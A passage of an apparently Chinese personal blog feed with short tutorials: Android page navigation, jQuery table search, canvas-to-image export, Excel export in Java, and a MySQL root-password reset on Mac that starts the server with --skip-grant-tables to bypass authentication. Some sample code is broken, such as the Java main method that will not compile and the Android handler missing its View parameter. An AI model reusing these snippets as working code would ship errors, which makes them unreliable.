class="line">        android:id=<span class="string">"@+id/button"</span></span><br><span class="line">        android:text=<span class="string">"点击提交 "</span></span><br><span class="line">        android:layout_margin=<span class="string">"100dp"</span></span><br><span class="line">        android:layout_width=<span class="string">"127dp"</span></span><br><span class="line">        android:layout_height=<span class="string">"wrap_content"</span></span><br><span class="line">        android:onClick=<span class="string">"sendMessage"</span> /&gt;</span><br><span class="line">&lt;/LinearLayout&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>我对按钮加了一个onClick事件。</p><h2 id="编写对应的mainactivity-java">编写对应的MainActivity.java</h2><p>在search.xml对应的MainActivity.java文件中我们写好onCreate方法（每个文件都会有）以及sendMessage方法：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line">public class MainActivity extends AppCompatActivity &#123;</span><br><span class="line">    public final static String EXTRA_MESSAGE = "uno.meng.download.MESSAGE";</span><br><span class="line">    public void sendMessage()&#123;</span><br><span class="line">        EditText editText = (EditText)findViewById(R.id.edit_message);</span><br><span class="line">        String message = editText.getText().toString();</span><br><span class="line">        Intent intent = new Intent(this, ResultActivity.class);</span><br><span class="line">        intent.putExtra(EXTRA_MESSAGE,message);</span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState)&#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.search);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="编写接收界面result-xml">编写接收界面result.xml</h2><p>然后到result.xml接收（我用的一个框来接收）：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span><br><span class="line">&lt;LinearLayout xmlns:android=<span class="string">"http://schemas.android.com/apk/res/android"</span></span><br><span class="line">    xmlns:tools=<span class="string">"http://schemas.android.com/tools"</span></span><br><span class="line">    android:orientation=<span class="string">"vertical"</span></span><br><span class="line">    android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">    android:layout_height=<span class="string">"match_parent"</span></span><br><span class="line">    android:weightSum=<span class="string">"1"</span>&gt;</span><br><span class="line">    &lt;TextView</span><br><span class="line">        android:layout_margin=<span class="string">"30dp"</span></span><br><span class="line">        android:layout_width=<span class="string">"match_parent"</span></span><br><span class="line">        android:layout_height=<span class="string">"80dp"</span>/&gt;</span><br><span class="line">&lt;/LinearLayout&gt;</span><br></pre>      </td>    </tr>  </table></figure><h2 id="编写接收对应的resultactivity-java">编写接收对应的ResultActivity.java</h2><p>编写对应的ResultActivity.java文件， 将从MainActivity.java接收来的文字打印到result.xml的框中：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line">public class ResultActivity extends AppCompatActivity&#123;</span><br><span class="line">    private Intent intent;</span><br><span class="line">    @Override</span><br><span class="line">    protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.result);</span><br><span class="line">        intent = getIntent();</span><br><span class="line">        String message = intent.getStringExtra(MainActivity.EXTRA_MESSAGE);</span><br><span class="line">        System.out.println(message);</span><br><span class="line">       TextView textview = new TextView(this);</span><br><span class="line">       textview.setTextSize(100);</span><br><span class="line">       textview.setText(message);</span><br><span class="line">       setContentView(textview);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p>到此为止，已经完成了Android页面跳转！</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/1da18548/">http://home.meng.uno/articles/1da18548/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      前情提要
开发安卓单页面程序久了，必然会思考怎么开发像现在一般Android应用程序那样的多页面（指页面有跳转）程序，我也是在搜索了别人的博客之后，才总结出如下的这点精华步骤！

编写AndroidManifest.xml
首先，我们要确定我们需要怎样的跳转，既然跳转，无非就是自动跳转或者点击按钮，无论哪种，首先我们必须有两个界面（至少），所以在AndroidManifest.xml中，我们需要这样写：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24


&lt;manifest xmlns:android=&quot;http:
    
    </summary>
    
      <category term="Application" scheme="http://home.meng.uno/categories/Application/"/>
    
    
      <category term="Android" scheme="http://home.meng.uno/tags/Android/"/>
    
      <category term="页面跳转" scheme="http://home.meng.uno/tags/%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/"/>
    
  </entry>
  
  <entry>
    <title>表格搜索</title>
    <link href="http://home.meng.uno/articles/49d54823/"/>
    <id>http://home.meng.uno/articles/49d54823/</id>
    <published>2016-12-13T04:29:32.000Z</published>
    <updated>2020-12-02T02:07:57.000Z</updated>
    
    <content type="html"><![CDATA[<p>虽然表格的排列相当困难，但表格的搜索却非常容易。增加一个搜索输入，如果那里的值匹配到了任意一行的文本，则显示该行，并隐藏其他所有的行。使用jQuery来实现就像下面这么简单：</p><figure class="highlight">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre>      </td>      <td class="code">        <pre><span class="line">var allRows = $("tr");</span><br><span class="line">$(<span class="string">"input#search"</span>).on(<span class="string">"keydown keyup"</span>, function() &#123;</span><br><span class="line">  allRows.hide();</span><br><span class="line">  $("tr:contains('" + $(this).val() + "')").show();</span><br><span class="line">&#125;);</span><br></pre>      </td>    </tr>  </table></figure><p>没有看错，就是这么简单，如果是在实际应用中，可以这样来写： 先声明一个按钮：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;<span class="selector-tag">input</span> type=<span class="string">"search"</span> id=<span class="string">"search"</span> placeholder=<span class="string">"请输入内容……"</span>&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>在input框之后加入以下JavaScript代码：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="comment">// Quick Table Search</span></span><br><span class="line">$(<span class="string">'#search'</span>).keyup(function() &#123;</span><br><span class="line">  var regex = new RegExp($('#search').val(), "i");</span><br><span class="line">  var rows = $('table tr:gt(0)');</span><br><span class="line">  rows.each(function (index) &#123;</span><br><span class="line">    title = $(this).children(<span class="string">"#title"</span>).html()</span><br><span class="line">    <span class="keyword">if</span> (title.search(regex) != -<span class="number">1</span>) &#123;</span><br><span class="line">      $(this).show();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $(this).hide();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre>      </td>    </tr>  </table></figure><p>完美运行有木有！！！</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/49d54823/">http://home.meng.uno/articles/49d54823/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      虽然表格的排列相当困难，但表格的搜索却非常容易。增加一个搜索输入，如果那里的值匹配到了任意一行的文本，则显示该行，并隐藏其他所有的行。使用jQuery来实现就像下面这么简单：

1
2
3
4
5


var allRows = $(&quot;tr&quot;);
$(&quot;input#search&quot;).on(&quot;keydown keyup&quot;, function() {
  allRows.hide();
  $(&quot;tr:contains(&#39;&quot; + $(this).val() + &quot;&#39;)&quot;).show();
});


没有看错，就是这么简单，如果是在实际应用中，可以这样来写： 先声明一个按钮：

1


&lt;inpu
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="软件工程" scheme="http://home.meng.uno/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
      <category term="表格" scheme="http://home.meng.uno/tags/%E8%A1%A8%E6%A0%BC/"/>
    
      <category term="搜索" scheme="http://home.meng.uno/tags/%E6%90%9C%E7%B4%A2/"/>
    
  </entry>
  
  <entry>
    <title>使用JavaScript将页面导出为图片</title>
    <link href="http://home.meng.uno/articles/f03eda59/"/>
    <id>http://home.meng.uno/articles/f03eda59/</id>
    <published>2016-12-13T04:20:18.000Z</published>
    <updated>2020-12-02T01:42:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>昨天心血来潮，突然想将我们组开发的网站上的“导出Excel”功能做一点拓展，于是就想能不能直接将网页表格导出为图片！</p><p>在我的不懈搜索后（搜索过程中绝大部分博客上的博文要么相互抄袭要么没什么屁用），终于得到了“canvas2image.js”这个神奇的JavaScript脚本，具体使用办法见如下代码：</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre>      </td>      <td class="code">        <pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;script src=<span class="string">"canvas2image.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;<span class="selector-tag">canvas</span>  id=<span class="string">"cvs"</span>&gt;&lt;/canvas&gt;</span><br><span class="line">    &lt;<span class="selector-tag">button</span> id=<span class="string">"save"</span>&gt;save&lt;/button&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="selector-tag">var</span> <span class="selector-tag">canvas</span>, ctx, bMouseIsDown = false, iLastX, iLastY,</span><br><span class="line">        <span class="variable">$save</span>, <span class="variable">$imgs</span>,</span><br><span class="line">        <span class="variable">$convert</span>, <span class="variable">$imgW</span>, <span class="variable">$imgH</span>,</span><br><span class="line">        $sel;</span><br><span class="line">    function init ()&#123;</span><br><span class="line">        canvas = document.getElementById('cvs');</span><br><span class="line">        ctx = canvas.getContext('2d');</span><br><span class="line">        $save = document.getElementById('save');</span><br><span class="line">        $convert = document.getElementById('convert');</span><br><span class="line">        $sel = "png";</span><br><span class="line">        $imgs = document.getElementById('imgs');</span><br><span class="line">        $imgW = 1980;</span><br><span class="line">        $imgH = 2000;</span><br><span class="line">        bind();</span><br><span class="line">        draw();</span><br><span class="line">    &#125;</span><br><span class="line">    function bind () &#123;</span><br><span class="line">        <span class="selector-tag">canvas</span><span class="selector-class">.onmousedown</span> = function(e) &#123;</span><br><span class="line">            bMouseIsDown = true;</span><br><span class="line">            iLastX = e.clientX - canvas.offsetLeft + (window.pageXOffset||document.body.scrollLeft||document.documentElement.scrollLeft);</span><br><span class="line">            iLastY = e.clientY - canvas.offsetTop + (window.pageYOffset||document.body.scrollTop||document.documentElement.scrollTop);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="selector-tag">canvas</span><span class="selector-class">.onmouseup</span> = function() &#123;</span><br><span class="line">            bMouseIsDown = false;</span><br><span class="line">            iLastX = -1;</span><br><span class="line">            iLastY = -1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="selector-tag">canvas</span><span class="selector-class">.onmousemove</span> = function(e) &#123;</span><br><span class="line">            <span class="keyword">if</span> (bMouseIsDown) &#123;</span><br><span class="line">                var iX = e.clientX - canvas.offsetLeft + (window.pageXOffset||document.body.scrollLeft||document.documentElement.scrollLeft);</span><br><span class="line">                var iY = e.clientY - canvas.offsetTop + (window.pageYOffset||document.body.scrollTop||document.documentElement.scrollTop);</span><br><span class="line">                ctx.moveTo(iLastX, iLastY);</span><br><span class="line">                ctx.lineTo(iX, iY);</span><br><span class="line">                ctx.stroke();</span><br><span class="line">                iLastX = iX;</span><br><span class="line">                iLastY = iY;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable">$save</span><span class="selector-class">.onclick</span> = function (e) &#123;</span><br><span class="line">            <span class="selector-tag">var</span> type = <span class="variable">$sel</span><span class="selector-class">.value</span>,</span><br><span class="line">                w = <span class="variable">$imgW</span><span class="selector-class">.value</span>,</span><br><span class="line">                h = $imgH.value;</span><br><span class="line">            Canvas2Image.saveAsImage(canvas, w, h, type);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    onload = init;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/f03eda59/">http://home.meng.uno/articles/f03eda59/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      昨天心血来潮，突然想将我们组开发的网站上的“导出Excel”功能做一点拓展，于是就想能不能直接将网页表格导出为图片！

在我的不懈搜索后（搜索过程中绝大部分博客上的博文要么相互抄袭要么没什么屁用），终于得到了“canvas2image.js”这个神奇的JavaScript脚本，具体使用办法见如下代码：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52

    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="页面" scheme="http://home.meng.uno/tags/%E9%A1%B5%E9%9D%A2/"/>
    
      <category term="导出图片" scheme="http://home.meng.uno/tags/%E5%AF%BC%E5%87%BA%E5%9B%BE%E7%89%87/"/>
    
  </entry>
  
  <entry>
    <title>Java导出Excel</title>
    <link href="http://home.meng.uno/articles/7725d215/"/>
    <id>http://home.meng.uno/articles/7725d215/</id>
    <published>2016-12-06T14:16:48.000Z</published>
    <updated>2020-12-02T01:50:27.000Z</updated>
    
    <content type="html"><![CDATA[<p>完成这个实验，你需要下载<code>jxl</code>jar包，具体方法自行百度。 接下来我将直接使用具体代码进行讲解我的实现过程。 文件名：  <code>ExcelAction.java</code></p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre>      </td>      <td class="code">        <pre><span class="line">package net.kuangmeng.excel;</span><br><span class="line"><span class="comment">/*这里是所有需要导入的库，不用担心当你写好其他代码时，编辑器会提示或者自动帮你补全！*/</span></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.List;</span><br><span class="line">import com.opensymphony.xwork2.ActionSupport;</span><br><span class="line">import jxl.Workbook;</span><br><span class="line">import jxl.format.Alignment;</span><br><span class="line">import jxl.format.Colour;</span><br><span class="line">import jxl.format.UnderlineStyle;</span><br><span class="line">import jxl.format.VerticalAlignment;</span><br><span class="line">import jxl.write.Label;</span><br><span class="line">import jxl.write.WritableCellFormat;</span><br><span class="line">import jxl.write.WritableFont;</span><br><span class="line">import jxl.write.WritableSheet;</span><br><span class="line">import jxl.write.WritableWorkbook;</span><br><span class="line">import jxl.write.WriteException;</span><br><span class="line">import jxl.write.biff.RowsExceededException;</span><br><span class="line"></span><br><span class="line">@SuppressWarnings(<span class="string">"serial"</span>)</span><br><span class="line">public class ExcelAction extends ActionSupport&#123;</span><br><span class="line"> public static void main(String[] args) &#123;</span><br><span class="line">     <span class="comment">//主函数调用</span></span><br><span class="line">     <span class="comment">//listth为导出excel的表头信息</span></span><br><span class="line">     list&lt;String&gt; listth = new ArrayList&lt;String&gt;;</span><br><span class="line">     <span class="comment">//listtd为导出的excel表项</span></span><br><span class="line">        list&lt;String&gt; listtd = new ArrayList&lt;String&gt;;</span><br><span class="line">        <span class="comment">//num为表的列数</span></span><br><span class="line">        int num ;</span><br><span class="line">     exportExcel(tablename,listth,listtd,num);</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//真正的导出excel方法</span></span><br><span class="line">public static void exportExcel(String fileName,List&lt;String&gt; listth,List&lt;String&gt; listtd,int num) &#123;</span><br><span class="line">    <span class="comment">//设置保存文件具体位置及文件名</span></span><br><span class="line"> String excelName ="C:\\Users\\meng\\Desktop\\"+fileName+".xls";</span><br><span class="line">  try &#123;  </span><br><span class="line">   File excelFile = new File(excelName);</span><br><span class="line">   <span class="comment">// 如果文件存在就删除它</span></span><br><span class="line">   <span class="keyword">if</span> (excelFile.exists())</span><br><span class="line">    excelFile.delete();</span><br><span class="line">   <span class="comment">// 打开文件</span></span><br><span class="line">   WritableWorkbook book = Workbook.createWorkbook(excelFile);</span><br><span class="line">   <span class="comment">// 生成名为“第一页”的工作表，参数0表示这是第一页</span></span><br><span class="line">   WritableSheet sheet = book.createSheet("Up2U导出表格 ", 0);</span><br><span class="line">   <span class="comment">// 文字样式</span></span><br><span class="line">   jxl<span class="selector-class">.write</span><span class="selector-class">.WritableFont</span> wfc = new jxl<span class="selector-class">.write</span><span class="selector-class">.WritableFont</span>(</span><br><span class="line">     WritableFont<span class="selector-class">.ARIAL</span>, <span class="number">10</span>, WritableFont<span class="selector-class">.NO_BOLD</span>, false,</span><br><span class="line">     UnderlineStyle.NO_UNDERLINE, jxl.format.Colour.BLACK);</span><br><span class="line">   jxl<span class="selector-class">.write</span><span class="selector-class">.WritableCellFormat</span> wcfFC = new jxl<span class="selector-class">.write</span><span class="selector-class">.WritableCellFormat</span>(</span><br><span class="line">     wfc);</span><br><span class="line">   jxl.write.WritableCellFormat wcfF = new jxl.write.WritableCellFormat(wfc);</span><br><span class="line">   wcfF.setBackground(jxl.format.Colour.BLACK);</span><br><span class="line">   <span class="comment">// 设置单元格样式</span></span><br><span class="line">   wcfFC.setBackground(jxl.format.Colour.GRAY_25);// 单元格颜色</span><br><span class="line">   wcfFC.setAlignment(jxl.format.Alignment.CENTRE);// 单元格居中</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 在Label对象的构造子中指名单元格位置是第一列第一行(0,0)</span></span><br><span class="line">   <span class="comment">// 以及单元格内容为</span></span><br><span class="line">   for(int i=0;i&lt;listth.size()/(num-2);i++)&#123;</span><br><span class="line">   for(int j=0;j&lt;num-2;j++)&#123;</span><br><span class="line">   sheet.addCell(new Label(j,i,listth.get(i*(num-2)+j),wcfFC));</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   for(int i=listth.size()/(num-2);i&lt;(listth.size()+listtd.size())/(num-2);i++)&#123;</span><br><span class="line">   for(int j=0;j&lt;num-2;j++)&#123;</span><br><span class="line">   sheet.addCell(new Label(j,i,listtd.get((i-1)*(num-2)+j),wcfF));</span><br><span class="line">   &#125;</span><br><span class="line">   &#125;</span><br><span class="line">  <span class="comment">// 写入数据并关闭文件</span></span><br><span class="line">   book.write();</span><br><span class="line">   book.close();</span><br><span class="line">   System.out.println("Excel创建成功");</span><br><span class="line">  &#125; catch (Exception e) &#123;</span><br><span class="line">   System.out.println(e);</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre>      </td>    </tr>  </table></figure><p><br><br>本文链接： <a href="http://home.meng.uno/articles/7725d215/">http://home.meng.uno/articles/7725d215/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      完成这个实验，你需要下载jxljar包，具体方法自行百度。 接下来我将直接使用具体代码进行讲解我的实现过程。 文件名： ExcelAction.java

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77

    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="软件工程" scheme="http://home.meng.uno/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Mac MySQL无法启动解决方案</title>
    <link href="http://home.meng.uno/articles/115ed5e0/"/>
    <id>http://home.meng.uno/articles/115ed5e0/</id>
    <published>2016-12-06T13:24:05.000Z</published>
    <updated>2020-12-02T01:55:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>正像这次博客的日期那样，《软工》大项目接近尾声了，然而直到今天我才真正解决了这个大难题——Mac MySQL无法使用！！！</p><p>检查MySQL是否成功安装</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">mysql --version</span><br></pre>      </td>    </tr>  </table></figure><p>关闭MySQL连接（即使没连也无妨）</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">sudo /usr/local/mysql/support-files/mysql<span class="selector-class">.server</span> stop</span><br></pre>      </td>    </tr>  </table></figure><p>登录管理员</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br></pre>      </td>      <td class="code">        <pre><span class="line">cd /usr/local/mysql/bin/</span><br><span class="line">sudo su</span><br></pre>      </td>    </tr>  </table></figure><p>禁止MySQL验证来登录（此时不验证密码）</p><figure class="highlight stylus">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">./mysqld_safe --skip-grant-tables &amp;</span><br></pre>      </td>    </tr>  </table></figure><p>（此时应该成功进入<code>mysql&gt;</code>）设置密码</p><figure class="highlight">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">UPDATE mysql.user SET authentication_string=PASSWORD('*****') WHERE User='root';</span><br></pre>      </td>    </tr>  </table></figure><p>（若显示密码过期）设置密码永不过期</p><figure class="highlight">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">ALTER USER 'root'@'localhost' PASSWORD EXPIRE NEVER;</span><br></pre>      </td>    </tr>  </table></figure><p>刷新MySQL的系统权限</p><figure class="highlight">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br></pre>      </td>      <td class="code">        <pre><span class="line">flush privileges;</span><br></pre>      </td>    </tr>  </table></figure><p>至此应该来说MySQL应该好使了。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/115ed5e0/">http://home.meng.uno/articles/115ed5e0/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      正像这次博客的日期那样，《软工》大项目接近尾声了，然而直到今天我才真正解决了这个大难题——Mac MySQL无法使用！！！

检查MySQL是否成功安装

1


mysql --version


关闭MySQL连接（即使没连也无妨）

1


sudo /usr/local/mysql/support-files/mysql.server stop


登录管理员

1
2


cd /usr/local/mysql/bin/
sudo su


禁止MySQL验证来登录（此时不验证密码）

1


./mysqld_safe --skip-grant-tables &amp;


（此时应该成功
    
    </summary>
    
      <category term="Software Engineering" scheme="http://home.meng.uno/categories/Software-Engineering/"/>
    
    
      <category term="软件工程" scheme="http://home.meng.uno/tags/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>Java发送邮件</title>
    <link href="http://home.meng.uno/articles/21f3b9c2/"/>
    <id>http://home.meng.uno/articles/21f3b9c2/</id>
    <published>2016-12-04T14:30:34.000Z</published>
    <updated>2020-12-02T01:50:41.000Z</updated>
    
    <content type="html"><![CDATA[<p>我觉得学会Java mail是一件很自豪的事，怎么说呢，邮箱这么有逼格的东西都能被你玩的很溜的话，一定不一般。 本次试验使用了  <code>javax.mail.jar</code>jar包，请自行百度下载。 我实现的Java mail主要包括4个部分：</p><ol>  <li>发送邮件使用的基本信息</li>  <li>邮件发送器</li>  <li>发件人设置</li>  <li>实际发送</li></ol><p>四个部分组成。</p><h2 id="发送邮件使用的基本信息">发送邮件使用的基本信息</h2><p>文件名：<code>MailSenderInfo.java</code> 代码如下，我仍然以备注的形式讲解：</p><figure class="highlight java">  <table>    <tr>      <td class="gutter">        <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 